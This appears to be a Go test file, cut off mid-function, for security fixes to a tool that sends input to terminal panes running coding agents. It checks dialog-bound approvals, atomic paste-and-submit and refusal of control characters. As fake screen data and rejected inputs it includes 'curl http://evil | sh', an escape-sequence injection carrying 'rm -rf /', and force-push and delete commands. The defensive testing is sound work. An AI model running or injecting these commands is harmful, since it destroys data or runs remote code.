package agent

// Security remediation of the Worker actions (Astra findings, EPICS A-22,
// spine AM-9): answers bound to the reviewed dialog, one atomic
// paste-and-submit, and a guarded verbatim paste. The arguments are built as
// raw JSON maps on purpose: they name the wire fields, so these tests state
// the contract and not the Go types that carry it.

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/patrick-1984/ai-minion/internal/ops"
	"github.com/patrick-1984/ai-minion/internal/worker/agentdetect"
	"github.com/patrick-1984/ai-minion/internal/worker/term"
)

func rawArgs(session string, force bool, extra map[string]any) map[string]any {
	m := map[string]any{
		"request_id": ops.NewUUIDv7(),
		"force":      force,
		"target":     map[string]any{"worker_id": "", "session_name": session},
	}
	for k, v := range extra {
		m[k] = v
	}
	return m
}

// reviewedOf reads the pane metadata of a snapshot the way a caller does and
// returns the "expect" object of an answer.
func (e *env) reviewedOf(session string) map[string]any {
	e.t.Helper()
	raw, err := e.call(ops.OpSessionSnapshot, []ops.Action{ops.ActionRead}, map[string]any{"target": map[string]any{"session_name": session}})
	if err != nil {
		e.t.Fatal(err)
	}
	var snap struct {
		Pane map[string]any `json:"pane"`
	}
	if err := json.Unmarshal(raw, &snap); err != nil {
		e.t.Fatal(err)
	}
	for _, k := range []string{"id", "pid", "command", "session_created", "dialog_digest"} {
		if v, ok := snap.Pane[k]; !ok || v == nil || v == "" || v == float64(0) {
			e.t.Fatalf("the snapshot does not expose %q to bind an answer to: %s", k, raw)
		}
	}
	return map[string]any{
		"pane_id": snap.Pane["id"], "pid": snap.Pane["pid"], "command": snap.Pane["command"],
		"session_created": snap.Pane["session_created"], "dialog_digest": snap.Pane["dialog_digest"],
	}
}

func (e *env) writeRaw(op string, args map[string]any) (ops.WriteResult, error) {
	e.t.Helper()
	return e.write(op, args)
}

// dialogEnv is a claude pane with an open permission dialog.
func dialogEnv(t *testing.T, question string) (*env, term.PaneRef) {
	t.Helper()
	e := newEnv(t)
	ref := e.host.addSession("work", "claude")
	e.host.setScreen(ref, "Bash command", "  "+question, "Do you want to proceed?", "❯ 1. Yes", "  2. Yes, and don't ask again", "  3. No", "Esc to cancel")
	e.cls.set("claude", "agent:claude", ops.PaneStateDialog, dialogChoices...)
	return e, ref
}

// --- finding 1: the answer is bound to the dialog that was reviewed ----------

func TestAnswerBindingMatchingDialogIsDelivered(t *testing.T) {
	e, _ := dialogEnv(t, "rm -rf build")
	exp := e.reviewedOf("work")
	res, err := e.writeRaw(ops.OpAnswer, rawArgs("work", false, map[string]any{"choice": "1", "expect": exp}))
	if err != nil || res.Outcome != ops.OutcomeDelivered {
		t.Fatalf("res = %+v err = %v", res, err)
	}
	if got := e.host.keys(); len(got) != 1 || got[0][0] != "1" {
		t.Fatalf("keys = %v", got)
	}
}

func TestAnswerWithoutABindingIsRefusedAsInvalid(t *testing.T) {
	e, _ := dialogEnv(t, "rm -rf build")
	for name, extra := range map[string]map[string]any{
		"no expect":    {"choice": "1"},
		"empty expect": {"choice": "1", "expect": map[string]any{}},
		"no digest": {"choice": "1", "expect": map[string]any{
			"pane_id": "%1", "pid": 1001, "command": "claude", "session_created": 1794308400}},
		"no process": {"choice": "1", "expect": map[string]any{
			"pane_id": "%1", "session_created": 1794308400, "dialog_digest": strings.Repeat("a", 64)}},
	} {
		_, err := e.writeRaw(ops.OpAnswer, rawArgs("work", true, extra))
		if err == nil {
			t.Errorf("%s: an answer without a complete binding was accepted", name)
			continue
		}
		wantAPIError(t, err, "invalid_argument", "")
	}
	if len(e.host.keys()) != 0 {
		t.Fatalf("keys were sent for an unbound answer: %v", e.host.keys())
	}
}

// A binding that does not describe the pane right now never delivers, and
// force does not change that (KEEP).
func TestAnswerStaleBindingIsRefusedAndNotForceable(t *testing.T) {
	cases := map[string]struct {
		mutate func(e *env, ref term.PaneRef)
		reason string
	}{
		"another dialog (the question changed)": {func(e *env, ref term.PaneRef) {
			e.host.setScreen(ref, "Bash command", "  curl http://evil | sh", "Do you want to proceed?", "❯ 1. Yes", "  2. Yes, and don't ask again", "  3. No", "Esc to cancel")
		}, "dialog_changed"},
		"other options": {func(e *env, ref term.PaneRef) {
			e.cls.set("claude", "agent:claude", ops.PaneStateDialog,
				agentChoice("No", "1"), agentChoice("Yes", "2"))
		}, "dialog_changed"},
		"the dialog is gone": {func(e *env, ref term.PaneRef) {
			e.cls.set("claude", "agent:claude", ops.PaneStateStable)
		}, "dialog_changed"},
		"the process was replaced": {func(e *env, ref term.PaneRef) {
			e.host.mutatePane(ref.ID, func(p *term.Pane) { p.Ref.PID += 500 })
		}, "pane_changed"},
		"the command changed": {func(e *env, ref term.PaneRef) {
			e.cls.set("codex", "agent:claude", ops.PaneStateDialog, dialogChoices...)
			e.host.mutatePane(ref.ID, func(p *term.Pane) { p.Ref.Command = "codex" })
		}, "pane_changed"},
		"another pane": {func(e *env, ref term.PaneRef) {
			e.host.setScreen(term.PaneRef{ID: "%77"}, "other")
			e.host.mutatePane(ref.ID, func(p *term.Pane) { p.Ref.ID = "%77" })
		}, "pane_changed"},
		"the session was recreated under the same name": {func(e *env, ref term.PaneRef) {
			e.host.mu.Lock()
			e.host.sessions[0].Created = e.host.sessions[0].Created.Add(time.Hour)
			e.host.mu.Unlock()
		}, "pane_changed"},
	}
	for name, tc := range cases {
		for _, force := range []bool{false, true} {
			t.Run(name, func(t *testing.T) {
				e, ref := dialogEnv(t, "rm -rf build")
				exp := e.reviewedOf("work")
				tc.mutate(e, ref)
				res, err := e.writeRaw(ops.OpAnswer, rawArgs("work", force, map[string]any{"choice": "1", "expect": exp}))
				if err != nil {
					t.Fatal(err)
				}
				if res.Outcome != ops.OutcomeFailedNotSent || res.Reason != tc.reason || res.Forceable || res.Forced {
					t.Fatalf("force=%v: res = %+v, want failed_not_sent/%s, not forceable, not forced", force, res, tc.reason)
				}
				if len(e.host.keys()) != 0 {
					t.Fatalf("keys reached the pane: %v", e.host.keys())
				}
			})
		}
	}
}

// The legacy contract of the facade could be bypassed by checking first and
// calling the Worker second. Here the dialog changes while the answer waits
// for the pane lock; the Worker checks after the lock and refuses.
func TestAnswerBindingIsCheckedUnderTheLock(t *testing.T) {
	e, ref := dialogEnv(t, "rm -rf build")
	exp := e.reviewedOf("work")

	entered, release := make(chan struct{}), make(chan struct{})
	var once sync.Once
	e.host.mu.Lock()
	e.host.onPaste = func() { once.Do(func() { close(entered) }); <-release }
	e.host.mu.Unlock()

	holder := make(chan struct{})
	go func() {
		defer close(holder)
		_, _ = e.writeRaw(ops.OpSendText, rawArgs("work", true, map[string]any{"text": "holding the lock"}))
	}()
	<-entered

	type out struct {
		res ops.WriteResult
		err error
	}
	done := make(chan out, 1)
	go func() {
		res, err := e.writeRaw(ops.OpAnswer, rawArgs("work", false, map[string]any{"choice": "1", "expect": exp}))
		done <- out{res, err}
	}()
	time.Sleep(150 * time.Millisecond) // the answer is now waiting for the lock
	e.host.setScreen(ref, "Bash command", "  git push --force origin main", "Do you want to proceed?", "❯ 1. Yes", "  2. Yes, and don't ask again", "  3. No", "Esc to cancel")
	close(release)
	<-holder
	o := <-done
	if o.err != nil {
		t.Fatal(o.err)
	}
	if o.res.Outcome != ops.OutcomeFailedNotSent || o.res.Reason != "dialog_changed" || o.res.Forceable {
		t.Fatalf("res = %+v", o.res)
	}
	if len(e.host.keys()) != 0 {
		t.Fatalf("the answer for the old dialog reached the new one: %v", e.host.keys())
	}
}

// A drifting selection marker of an option row is not a different dialog; a
// row that merely looks like a spinner is content and is.
func TestAnswerBindingIgnoresOnlyTheSelectionMarker(t *testing.T) {
	e, ref := dialogEnv(t, "rm -rf build")
	exp := e.reviewedOf("work")
	e.host.setScreen(ref, "Bash command", "  rm -rf build", "Do you want to proceed?", "  1. Yes", "❯ 2. Yes, and don't ask again", "  3. No", "Esc to cancel")
	res, err := e.writeRaw(ops.OpAnswer, rawArgs("work", false, map[string]any{"choice": "3", "expect": exp}))
	if err != nil || res.Outcome != ops.OutcomeDelivered {
		t.Fatalf("res = %+v err = %v", res, err)
	}
	e2, ref2 := dialogEnv(t, "rm -rf build")
	exp2 := e2.reviewedOf("work")
	e2.host.setScreen(ref2, "Bash command", "  rm -rf build", "Do you want to proceed?", "❯ 1. Yes", "  2. Yes, and don't ask again", "  3. No", "Esc to cancel", "✻ Thinking… (12s · esc to interrupt)")
	res, err = e2.writeRaw(ops.OpAnswer, rawArgs("work", false, map[string]any{"choice": "1", "expect": exp2}))
	if err != nil || res.Outcome != ops.OutcomeFailedNotSent || res.Reason != "dialog_changed" || len(e2.host.keys()) != 0 {
		t.Fatalf("a new row on the screen was not a change: %+v, %v", res, err)
	}
}

// scrollbackHost is a host whose capture is the history followed by the visible
// screen, as a terminal multiplexer's is.
type scrollbackHost struct{ *fakeHost }

func (h scrollbackHost) Capture(ctx context.Context, p term.PaneRef, lines int) (ops.Screen, error) {
	h.mu.Lock()
	defer h.mu.Unlock()
	vis := h.screens[p.ID].Lines
	all := append([]string{"earlier output", "more earlier output"}, vis...)
	if lines > 0 && lines < len(all) {
		all = all[len(all)-lines:]
	}
	return ops.Screen{Width: 80, Lines: all}, nil
}

func TestSnapshotAndCaptureExposeTheReviewedMetadata(t *testing.T) {
	e, ref := dialogEnv(t, "rm -rf build")
	e.ex.host = scrollbackHost{e.host}
	for _, op := range []string{ops.OpSessionSnapshot, ops.OpSessionCapture} {
		raw, err := e.call(op, []ops.Action{ops.ActionRead}, map[string]any{"target": map[string]any{"session_name": "work"}})
		if err != nil {
			t.Fatal(err)
		}
		var r struct {
			Pane map[string]any `json:"pane"`
		}
		_ = json.Unmarshal(raw, &r)
		if r.Pane["id"] != ref.ID || r.Pane["pid"] != float64(ref.PID) || r.Pane["command"] != "claude" {
			t.Errorf("%s: pane = %v", op, r.Pane)
		}
		if d, _ := r.Pane["dialog_digest"].(string); len(d) != 64 {
			t.Errorf("%s: dialog_digest = %q", op, r.Pane["dialog_digest"])
		}
		if c, _ := r.Pane["session_created"].(float64); c <= 0 {
			t.Errorf("%s: session_created = %v", op, r.Pane["session_created"])
		}
	}
	// No dialog, no digest: nothing can be answered.
	e.cls.set("claude", "agent:claude", ops.PaneStateStable)
	raw, _ := e.call(ops.OpSessionSnapshot, []ops.Action{ops.ActionRead}, map[string]any{"target": map[string]any{"session_name": "work"}})
	if strings.Contains(string(raw), "dialog_digest") {
		t.Errorf("a pane without a dialog has a digest: %s", raw)
	}
}

// --- finding 2: paste and submit are one operation ---------------------------

func submitEnv(t *testing.T, command string) (*env, term.PaneRef) {
	t.Helper()
	e := newEnv(t)
	ref := e.host.addSession("work", command)
	e.cls.set(command, "agent:"+command, ops.PaneStateStable)
	return e, ref
}

func TestSendTextSubmitIsOneRequestOnOnePane(t *testing.T) {
	e, ref := submitEnv(t, "claude")
	res, err := e.writeRaw(ops.OpSendText, rawArgs("work", false, map[string]any{"text": "do the thing", "submit": true}))
	if err != nil || res.Outcome != ops.OutcomeDelivered {
		t.Fatalf("res = %+v err = %v", res, err)
	}
	want := []string{"paste " + ref.ID, "keys " + ref.ID + " Enter"}
	if got := e.host.eventLog(); strings.Join(got, "|") != strings.Join(want, "|") {
		t.Fatalf("events = %v, want %v", got, want)
	}
	if rows := e.audit(); len(rows) != 1 {
		t.Fatalf("%d audit rows for one request, want 1", len(rows))
	}
}

func TestSendTextWithoutSubmitAddsNoEnter(t *testing.T) {
	e, ref := submitEnv(t, "claude")
	e.mustWrite(ops.OpSendText, sendText("work", "first\nsecond", false))
	if got := e.host.eventLog(); strings.Join(got, "|") != "paste "+ref.ID {
		t.Fatalf("events = %v, want the paste alone", got)
	}
	res, err := e.writeRaw(ops.OpSendText, rawArgs("work", false, map[string]any{"text": "again", "submit": false}))
	if err != nil || res.Outcome != ops.OutcomeDelivered || len(e.host.keys()) != 0 {
		t.Fatalf("submit=false: res = %+v keys = %v", res, e.host.keys())
	}
}

// The active pane changes between the paste and the Enter. The Enter goes to
// the pane that got the text, or nowhere; never to the new active pane.
func TestSendTextSubmitKeepsThePaneAcrossPasteAndEnter(t *testing.T) {
	e, ref := submitEnv(t, "claude")
	other := term.PaneRef{ID: "%90", PID: 9090, Command: "bash"}
	e.host.onPaste = func() {
		e.host.mu.Lock()
		defer e.host.mu.Unlock()
		s := &e.host.sessions[0]
		s.Panes[0].Active = false
		s.Panes = append(s.Panes, term.Pane{Ref: other, Window: 0, Index: 1, Active: true})
	}
	res, err := e.writeRaw(ops.OpSendText, rawArgs("work", false, map[string]any{"text": "rm -rf build", "submit": true}))
	if err != nil {
		t.Fatal(err)
	}
	for _, ev := range e.host.eventLog() {
		if strings.Contains(ev, other.ID) {
			t.Fatalf("input reached the pane that became active after the paste: %v", e.host.eventLog())
		}
	}
	if res.Outcome != ops.OutcomeDelivered {
		t.Fatalf("res = %+v events = %v", res, e.host.eventLog())
	}
	if got := e.host.eventLog(); len(got) != 2 || got[1] != "keys "+ref.ID+" Enter" {
		t.Fatalf("events = %v", got)
	}
}

// Another writer cannot put text between the paste and the Enter.
func TestSendTextSubmitHoldsTheLockAcrossPasteAndEnter(t *testing.T) {
	e, ref := submitEnv(t, "claude")
	entered, release := make(chan struct{}), make(chan struct{})
	var once sync.Once
	e.host.onPaste = func() {
		once.Do(func() { close(entered); <-release })
	}
	first := make(chan ops.WriteResult, 1)
	go func() {
		res, _ := e.writeRaw(ops.OpSendText, rawArgs("work", false, map[string]any{"text": "first", "submit": true}))
		first <- res
	}()
	<-entered
	second := make(chan ops.WriteResult, 1)
	go func() {
		res, _ := e.writeRaw(ops.OpSendText, rawArgs("work", false, map[string]any{"text": "intruder"}))
		second <- res
	}()
	time.Sleep(150 * time.Millisecond)
	close(release)
	if r := <-first; r.Outcome != ops.OutcomeDelivered {
		t.Fatalf("first = %+v", r)
	}
	if r := <-second; r.Outcome != ops.OutcomeDelivered {
		t.Fatalf("second = %+v", r)
	}
	want := []string{"paste " + ref.ID, "keys " + ref.ID + " Enter", "paste " + ref.ID}
	if got := e.host.eventLog(); strings.Join(got, "|") != strings.Join(want, "|") {
		t.Fatalf("events = %v, want %v", got, want)
	}
}

func TestSendTextSubmitOutcomesAreTruthful(t *testing.T) {
	cases := map[string]struct {
		setup   func(h *fakeHost)
		outcome ops.Outcome
		reason  string
		events  int // deliveries that reached the pane
	}{
		"the pane changed before the paste: nothing was sent": {
			func(h *fakeHost) { h.pasteErr = term.ErrPaneChanged }, ops.OutcomeFailedNotSent, "pane_changed", 0},
		"the paste outcome is unknown: no Enter, unknown": {
			func(h *fakeHost) { h.pasteErr = errors.New("tmux timed out") }, ops.OutcomeUnknown, "internal", 0},
		"the pane changed after the paste: partial, never failed_not_sent": {
			func(h *fakeHost) { h.keysErr, h.keysAfter = term.ErrPaneChanged, 0 }, ops.OutcomePartial, "pane_changed", 1},
		"the pane vanished after the paste: partial": {
			func(h *fakeHost) { h.keysErr, h.keysAfter = term.ErrNotFound, 0 }, ops.OutcomePartial, "target_not_found", 1},
		"the Enter outcome is unknown after the paste: unknown": {
			func(h *fakeHost) { h.keysErr, h.keysAfter = errors.New("tmux timed out"), 0 }, ops.OutcomeUnknown, "internal", 1},
	}
	for name, tc := range cases {
		t.Run(name, func(t *testing.T) {
			e, _ := submitEnv(t, "claude")
			tc.setup(e.host)
			res, err := e.writeRaw(ops.OpSendText, rawArgs("work", false, map[string]any{"text": "hello", "submit": true}))
			if err != nil {
				t.Fatal(err)
			}
			if res.Outcome != tc.outcome || res.Reason != tc.reason || res.Forceable {
				t.Fatalf("res = %+v, want %s/%s", res, tc.outcome, tc.reason)
			}
			if n := len(e.host.eventLog()); n != tc.events {
				t.Fatalf("events = %v, want %d", e.host.eventLog(), tc.events)
			}
			if tc.events == 1 && res.Outcome == ops.OutcomeFailedNotSent {
				t.Fatal("failed_not_sent after the text went out")
			}
			// The cached answer of the same request id is the same answer.
		})
	}
}

// force applies to the guards of this one request, once, on the pane that was
// classified; it is not a second chance for a second call.
func TestSendTextSubmitGuardsApplyOnceWithForce(t *testing.T) {
	e := newEnv(t)
	ref := e.host.addSession("work", "bash")
	e.cls.set("bash", ops.PaneKindShell, ops.PaneStateStable)
	res, err := e.writeRaw(ops.OpSendText, rawArgs("work", false, map[string]any{"text": "ls", "submit": true}))
	if err != nil || res.Outcome != ops.OutcomeFailedNotSent || res.Reason != "shell_pane" || !res.Forceable {
		t.Fatalf("refusal = %+v err = %v", res, err)
	}
	if len(e.host.eventLog()) != 0 {
		t.Fatalf("events after a refusal: %v", e.host.eventLog())
	}
	res, err = e.writeRaw(ops.OpSendText, rawArgs("work", true, map[string]any{"text": "ls", "submit": true}))
	if err != nil || res.Outcome != ops.OutcomeDelivered || !res.Forced {
		t.Fatalf("forced = %+v err = %v", res, err)
	}
	want := []string{"paste " + ref.ID, "keys " + ref.ID + " Enter"}
	if got := e.host.eventLog(); strings.Join(got, "|") != strings.Join(want, "|") {
		t.Fatalf("events = %v", got)
	}
}

// --- finding 3: controls are not text ----------------------------------------

func TestSendTextRefusesInputControlsAndKeepsTabAndLF(t *testing.T) {
	e, _ := submitEnv(t, "claude")
	for _, text := range []string{"a\rb", "a\r\nb", "a\x1b[201~rm -rf /\r", "a\x1bb", "a\x00b", "a\x03b", "a\x7fb", "a\u0085b", "a\u009bb"} {
		for _, submit := range []bool{false, true} {
			_, err := e.writeRaw(ops.OpSendText, rawArgs("work", true, map[string]any{"text": text, "submit": submit}))
			if err == nil {
				t.Errorf("%q (submit %v): a text with an input control was accepted", text, submit)
				continue
			}
			wantAPIError(t, err, "invalid_argument", "")
		}
	}
	if len(e.host.eventLog()) != 0 {
		t.Fatalf("something reached the pane: %v", e.host.eventLog())
	}
	res := e.mustWrite(ops.OpSendText, sendText("work", "col1\tcol2\nline two\n", false))
	if res.Outcome != ops.OutcomeDelivered {
		t.Fatalf("TAB and LF must stay allowed: %+v", res)
	}
	if got := e.host.pastes(); len(got) != 1 || got[0].Text != "col1\tcol2\nline two\n" {
		t.Fatalf("pastes = %v", got)
	}
}

// send_keys stays the place for intentional control input.
func TestSendKeysStillSendsIntentionalControlKeys(t *testing.T) {
	e, _ := submitEnv(t, "claude")
	res := e.mustWrite(ops.OpSendKeys, sendKeys("work", false, "Escape", "C-c", "Tab", "Enter"))
	if res.Outcome != ops.OutcomeDelivered {
		t.Fatalf("res = %+v", res)
	}
}

// TestAnswerDecimalChoiceIsAPositionEvenWithNumericLabels is the regression of
// the browser interaction: the UI sends the 1-based position of the button, and
// a dialog may label its options "2", "4" and "8". The position 2 is the second
// option (label "4", keys "b"), not the first option whose label is "2". The
// reviewed binding is still required and checked in the same call.
func TestAnswerDecimalChoiceIsAPositionEvenWithNumericLabels(t *testing.T) {
	numeric := []agentdetect.Choice{
		{Label: "2", Keys: []string{"a"}},
		{Label: "4", Keys: []string{"b"}},
		{Label: "8", Keys: []string{"c"}},
	}
	for choice, want := range map[string]string{"1": "a", "2": "b", "3": "c", " 2 ": "b"} {
		e := newEnv(t)
		e.host.addSession("work", "claude")
		e.cls.set("claude", "agent:claude", ops.PaneStateDialog, numeric...)
		res := e.mustWrite(ops.OpAnswer, e.answerArgs(choice, false))
		if res.Outcome != ops.OutcomeDelivered {
			t.Fatalf("choice %q: %+v", choice, res)
		}
		if got := e.host.keys(); len(got) != 1 || strings.Join(got[0], ",") != want {
			t.Fatalf("choice %q sent %v, want the keys %q of position %s", choice, got, want, strings.TrimSpace(choice))
		}
	}

	// The label "8" has position 3: a position beyond the options is refused,
	// it is not looked up as a label ("4" would have matched the label of
	// position 2).
	for _, choice := range []string{"4", "8", "0", "10"} {
		e := newEnv(t)
		e.host.addSession("work", "claude")
		e.cls.set("claude", "agent:claude", ops.PaneStateDialog, numeric...)
		_, err := e.write(ops.OpAnswer, e.answerArgs(choice, false))
		wantAPIError(t, err, "invalid_argument", "")
		if len(e.host.keys()) != 0 {
			t.Fatalf("choice %q: an ambiguous choice sent %v", choice, e.host.keys())
		}
	}

	// Labels and keys that are not decimal numbers keep working, and a signed
	// number is not a position.
	e := newEnv(t)
	e.host.addSession("work", "aider")
	e.cls.set("aider", "agent:aider", ops.PaneStateDialog,
		agentdetect.Choice{Label: "Yes", Keys: []string{"y", "Enter"}}, agentdetect.Choice{Label: "No", Keys: []string{"n", "Enter"}})
	e.mustWrite(ops.OpAnswer, e.answerArgs("no", false))
	if got := e.host.keys(); len(got) != 1 || strings.Join(got[0], ",") != "n,Enter" {
		t.Fatalf("label answer sent %v", got)
	}
	if _, err := e.write(ops.OpAnswer, e.answerArgs("+1", false)); err == nil {
		t.Fatal("+1 was accepted as a position or a label")
	}
}

// longDialog is a real approval dialog of 30 rows: the command is at the top and
// the question, far below it, is all the classifier's window of the last 25
// non-blank rows sees. The strings are terminal test data on a fake host; nothing
// here is ever run.
func longDialog(command string, filler string) []string {
	lines := []string{"Bash command", "  " + command}
	for i := 0; i < 24; i++ {
		lines = append(lines, "  "+filler)
	}
	return append(lines, "Do you want to proceed?", "❯ 1. Yes", "  2. No", "Esc to cancel")
}

func realClassifierEnv(t *testing.T, lines []string) (*env, term.PaneRef) {
	t.Helper()
	e := newEnv(t)
	ref := e.host.addSession("work", "claude")
	e.ex.classify = agentdetect.New(agentdetect.WithProcessSource(nil))
	e.host.setScreen(ref, lines...)
	return e, ref
}

// TestAnswerBindsTheWholeVisibleDialog is the regression of the audit finding:
// the digest covered only the last 25 non-blank rows, so the command of a long
// dialog could change above them with the old review still matching. The review
// is now bound to every row of the visible screen. With the real classifier and
// the real Executor: the unchanged dialog is answered with force=false, and a
// changed command, or a change anywhere else on the screen, is refused with
// dialog_changed, sends nothing, and is not forceable. The tail seen by the
// classifier is identical in all of them.
func TestAnswerBindsTheWholeVisibleDialog(t *testing.T) {
	base := longDialog("rm -rf ./build", "echo unchanged")
	deliver := func(_ string, e *env, exp map[string]any) (ops.WriteResult, error) {
		t.Helper()
		return e.writeRaw(ops.OpAnswer, rawArgs("work", false, map[string]any{"choice": "1", "expect": exp}))
	}

	e, ref := realClassifierEnv(t, base)
	if st := e.host.screens[ref.ID]; len(st.Lines) < 30 {
		t.Fatalf("the dialog has %d rows, want 30 or more", len(st.Lines))
	}
	exp := e.reviewedOf("work")
	if res, err := deliver("unchanged", e, exp); err != nil || res.Outcome != ops.OutcomeDelivered {
		t.Fatalf("the unchanged dialog: %+v, %v", res, err)
	}
	if len(e.host.keys()) != 1 {
		t.Fatalf("keys = %v", e.host.keys())
	}

	mid := append([]string(nil), base...)
	mid[10] = "  echo changed"
	changes := map[string][]string{
		"the command":         longDialog("rm -rf ./source", "echo unchanged"),
		"a row in the middle": mid,
		"the header":          append([]string{"Bash command (as root)"}, base[1:]...),
	}
	for name, lines := range changes {
		for _, force := range []bool{false, true} {
			e, ref := realClassifierEnv(t, base)
			exp := e.reviewedOf("work")
			e.host.setScreen(ref, lines...)
			res, err := e.writeRaw(ops.OpAnswer, rawArgs("work", force, map[string]any{"choice": "1", "expect": exp}))
			if err != nil || res.Outcome != ops.OutcomeFailedNotSent || res.Reason != "dialog_changed" || res.Forceable || res.Forced || len(e.host.keys()) != 0 {
				t.Errorf("%s changed, force=%v: %+v keys=%v err=%v", name, force, res, e.host.keys(), err)
			}
		}
	}

	// Only the selection marker of an option may move; trailing white space and
	// blank rows are content and are refused (TestReviewedDialogKeepsEveryRow...).
	lines := append([]string(nil), base...)
	lines[len(lines)-3], lines[len(lines)-2] = "  1. Yes", "❯ 2. No"
	e2, ref2 := realClassifierEnv(t, base)
	exp2 := e2.reviewedOf("work")
	e2.host.setScreen(ref2, lines...)
	if res, err := deliver("marker", e2, exp2); err != nil || res.Outcome != ops.OutcomeDelivered {
		t.Fatalf("a moved selection marker was refused: %+v, %v", res, err)
	}
}

// TestReviewedDialogKeepsEveryRowAndSpaceOfTheCommand is the reproduction of the
// second review: through the real Executor and classifier on a fake terminal, an
// approval of one screen must not cover another that differs by a command that
// looks like a status line, by a blank line of a here-document, or by a space
// after a shell continuation. (The strings are terminal test data; nothing is
// ever run.) Each old binding is refused with force false and true, nothing is
// sent, and an unchanged screen still delivers.
func TestReviewedDialogKeepsEveryRowAndSpaceOfTheCommand(t *testing.T) {
	tail := []string{"Do you want to proceed?", "❯ 1. Yes", "  2. No", "Esc to cancel"}
	with := func(rows ...string) []string { return append(append([]string(nil), rows...), tail...) }
	for name, pair := range map[string][2][]string{
		"status-shaped command": {
			with("Bash command", "  printf '1s esc'; echo old"), with("Bash command", "  printf '1s esc'; echo new")},
		"blank line in here-document": {
			with("Bash command", "  cat <<'EOF'", "alpha", "", "beta", "EOF"), with("Bash command", "  cat <<'EOF'", "alpha", "beta", "EOF")},
		"space after shell continuation": {
			with("Bash command", "  printf '%s' foo\\", "bar"), with("Bash command", "  printf '%s' foo\\ ", "bar")},
	} {
		for _, force := range []bool{false, true} {
			e, ref := realClassifierEnv(t, pair[0])
			exp := e.reviewedOf("work")
			e.host.setScreen(ref, pair[1]...)
			res, err := e.writeRaw(ops.OpAnswer, rawArgs("work", force, map[string]any{"choice": "1", "expect": exp}))
			if err != nil || res.Outcome != ops.OutcomeFailedNotSent || res.Reason != "dialog_changed" || res.Forceable || len(e.host.keys()) != 0 {
				t.Errorf("%s, force=%v: %+v keys=%v err=%v", name, force, res, e.host.keys(), err)
			}
		}
		e, _ := realClassifierEnv(t, pair[0])
		exp := e.reviewedOf("work")
		if res, err := e.writeRaw(ops.OpAnswer, rawArgs("work", false, map[string]any{"choice": "1", "expect": exp})); err != nil || res.Outcome != ops.OutcomeDelivered {
			t.Errorf("%s: the unchanged screen was refused: %+v, %v", name, res, err)
		}
	}
}

// captureOfHost returns a fixed capture, whatever the pane shows.
type captureOfHost struct {
	*fakeHost
	capture ops.Screen
}

func (h captureOfHost) Capture(context.Context, term.PaneRef, int) (ops.Screen, error) {
	return h.capture, nil
}

// TestCaptureBindsOnlyTheScreenItShows is the reproduction of the second review:
// the snapshot read for the metadata saw dialog A and the capture that was
// returned shows B. The metadata and the content must be one observation, so no
// digest is given for it, and a binding taken from a snapshot (one observation by
// construction) stays usable. When the capture does show the screen as its last
// rows the metadata is given and answers.
func TestCaptureBindsOnlyTheScreenItShows(t *testing.T) {
	dialog := func(cmd string) []string {
		return []string{"Bash command", "  " + cmd, "Do you want to proceed?", "❯ 1. Yes", "  2. No", "Esc to cancel"}
	}
	a, b := dialog("echo approval-A"), dialog("echo approval-B")
	capture := func(t *testing.T, e *env) ops.SessionCaptureResult {
		t.Helper()
		raw, err := e.call(ops.OpSessionCapture, []ops.Action{ops.ActionRead}, map[string]any{"target": map[string]any{"session_name": "work"}})
		if err != nil {
			t.Fatal(err)
		}
		var got ops.SessionCaptureResult
		if err := json.Unmarshal(raw, &got); err != nil {
			t.Fatal(err)
		}
		return got
	}

	// The capture returned shows B while the snapshot saw A.
	e, _ := realClassifierEnv(t, a)
	e.ex.host = captureOfHost{e.host, ops.Screen{Width: 80, Height: 24, Lines: b}}
	got := capture(t, e)
	if !strings.Contains(strings.Join(got.Screen.Lines, "\n"), "approval-B") {
		t.Fatal("the proof needs the capture of B")
	}
	if got.Pane.DialogDigest != "" {
		t.Fatalf("a digest of snapshot A came with the content of capture B: %q", got.Pane.DialogDigest)
	}

	// A capture too short to show the whole visible screen cannot establish it.
	e2, _ := realClassifierEnv(t, a)
	e2.ex.host = captureOfHost{e2.host, ops.Screen{Width: 80, Lines: a[3:]}}
	if d := capture(t, e2).Pane.DialogDigest; d != "" {
		t.Fatalf("a digest came with a capture that does not show the screen: %q", d)
	}

	// A capture that ends with the visible screen carries usable metadata, and an
	// answer bound to it is delivered while the dialog is unchanged and refused
	// when it changed.
	e3, ref3 := realClassifierEnv(t, a)
	e3.ex.host = scrollbackHost{e3.host}
	full := capture(t, e3)
	exp := ops.ReviewedDialog{PaneID: full.Pane.ID, PID: full.Pane.PID, Command: full.Pane.Command, SessionCreated: full.Pane.SessionCreated, DialogDigest: full.Pane.DialogDigest}
	if exp.DialogDigest == "" {
		t.Fatal("a complete capture gave no usable metadata")
	}
	e3.host.setScreen(ref3, b...)
	res, err := e3.writeRaw(ops.OpAnswer, rawArgs("work", false, map[string]any{"choice": "1", "expect": exp}))
	if err != nil || res.Outcome != ops.OutcomeFailedNotSent || res.Reason != "dialog_changed" || len(e3.host.keys()) != 0 {
		t.Fatalf("an answer bound to capture A was delivered to B: %+v keys=%v err=%v", res, e3.host.keys(), err)
	}
	e3.host.setScreen(ref3, a...)
	if res, err := e3.writeRaw(ops.OpAnswer, rawArgs("work", false, map[string]any{"choice": "1", "expect": exp})); err != nil || res.Outcome != ops.OutcomeDelivered {
		t.Fatalf("the unchanged dialog was refused: %+v, %v", res, err)
	}
}

// incompleteHost reports that the visible screen could not be read completely.
type incompleteHost struct{ *fakeHost }

func (h incompleteHost) Snapshot(ctx context.Context, p term.PaneRef) (ops.Screen, error) {
	scr, err := h.fakeHost.Snapshot(ctx, p)
	if err != nil {
		return scr, err
	}
	return scr, fmt.Errorf("pane %s: the visible screen exceeds the limits: %w", p.ID, term.ErrIncomplete)
}

// TestAnIncompleteScreenGetsNoBinding: the screen is returned (a partial screen
// is worth reading) and classified, but no digest is issued for it, so nothing
// can be approved on it, and an answer on a pane whose screen is incomplete now is
// refused with view_incomplete, not forceable, nothing sent.
func TestAnIncompleteScreenGetsNoBinding(t *testing.T) {
	e, _ := realClassifierEnv(t, []string{"Bash command", "  echo a", "Do you want to proceed?", "❯ 1. Yes", "  2. No", "Esc to cancel"})
	exp := e.reviewedOf("work") // a complete screen: the binding exists
	e.ex.host = incompleteHost{e.host}
	raw, err := e.call(ops.OpSessionSnapshot, []ops.Action{ops.ActionRead}, map[string]any{"target": map[string]any{"session_name": "work"}})
	if err != nil {
		t.Fatal(err)
	}
	var snap ops.SessionSnapshotResult
